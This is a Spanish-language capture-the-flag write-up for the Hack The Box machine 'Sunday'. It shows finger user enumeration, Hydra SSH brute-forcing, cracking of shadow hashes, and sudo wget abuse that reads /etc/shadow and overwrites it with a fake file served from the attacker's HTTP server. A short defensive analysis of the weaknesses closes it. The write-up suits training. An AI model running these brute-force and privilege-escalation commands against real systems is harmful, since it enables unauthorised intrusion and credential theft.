# Sunday ![Avatar](https://www.hackthebox.eu/storage/avatars/3a186834eba2b780dacdaadcc157d309_thumb.png)

## Initial Scan
```
79/tcp    open  finger  Sun Solaris fingerd
|_finger: No one logged on\x0D
111/tcp   open  rpcbind 2-4 (RPC #100000)
22022/tcp open  ssh     SunSSH 1.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 d2:e5:cb:bd:33:c7:01:31:0b:3c:63:d9:82:d9:f1:4e (DSA)
|_  1024 e4:2c:80:62:cf:15:17:79:ff:72:9d:df:8b:a6:c9:ac (RSA)
60815/tcp open  unknown
61350/tcp open  unknown
```

## Enum
### Finger

Usando finger-user-enum obtenemos los siguientes usuarios
```
admin@10.10.10.76
root@10.10.10.76
service@10.10.10.76
adm@10.10.10.76
mysql@10.10.10.76
access@10.10.10.76
user@10.10.10.76
sammy@10.10.10.76
sunny@10.10.10.76
bin@10.10.10.76
```
Quitamos los default y lanzamos un ataque de fuerza bruta usando hydra, la lista quedaria

```
root
admin
adm
user
sammy
sunny
```
Toca hacer bruteforcing
```
hydra -L user.txt -P rockyou.txt ssh://10.10.10.76 -s 22022 -t 64
```

La contraseña para sunny es sunday
```
[22022][ssh] host: 10.10.10.76   login: sunny   password: sunday
```
Al ir a entrar nos da el siguiente error
```
Unable to negotiate with 10.10.10.76 port 22022: no matching key exchange method found. Their offer: gss-group1-sha1-toWM5Slw5Ew8Mqkay+al2g==,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1
```

Para solventarlos cambiamos el comando de inicio de sesion en el shh:
```
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 sunny@10.10.10.76 -p 22022
```

No user.txt por ahora pero si que tenemos una carpeta de backups en /, veamos que hay en ella 

Un archivo llamado agent22 que no podemos leer y el shadow.backup

```
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```
Vamos a crackear el de sammy
```
pj@HTB:~$ john shadow.bk --wordlist=rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha256crypt, crypt(3) $5$ [SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
cooldude!        (?)
1g 0:00:00:40 DONE (202
```
Con esto entramos en sammy y leemos la user.txt

## Privesc
```
User sammy may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/wget
```
### Opcion 1 Shadow File Crack

```
sudo /usr/bin/wget -i /etc/shadow
root:$5$WVmHMduo$nI.KTRbAaUv1ZgzaGiHhpA2RNdoo3aMDgPBL25FZcoD:14146:::::::
```
Y a crackear

### Opcion 2 Wget root.txt
```
sudo /usr/bin/wget -i /root/root.txt
```

### Opcion 3 Fake Shadow

```
root:HASHPARAELPASSQUEHEMOSSACAO:14146::::::
daemon:NP:6445::::::
bin:NP:6445::::::
sys:NP:6445::::::
adm:NP:6445::::::
lp:NP:6445::::::
uucp:NP:6445::::::
nuucp:NP:6445::::::
dladm:*LK*:::::::
smmsp:NP:6445::::::
listen:*LK*:::::::
gdm:*LK*:::::::
zfssnap:NP:::::::
xvm:*LK*:6445::::::
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```
Ponemos en marcha un HTTP server en local con el, y hacemos el overwrite usando wget.

### Opcion 4 /root/troll

```
User sunny may run the following commands on this host:
    (root) NOPASSWD: /root/troll
```
Podemos sobreescribir con nuestro /bin/bash , el de nuestra máquina ese binario usando la opcion de Post.

# Analiśis de la intrusión
### Bad Password Policie
La politica de contraseñas del sistma es debil ya que las del user sammmy estan presentes en rockyou
### SSH Bruteforcing allowed
No existe ningún servicio como fail2ban en la máquina lo que nos permite lanzar un ataque de fuerza bruta de manera exitosa contra la misma
### Privileged wget execution
Desde el usuario sunny podemos ejecutar wget como sudo, esto nos permite leer y escribir en archivos de manera arbitraria

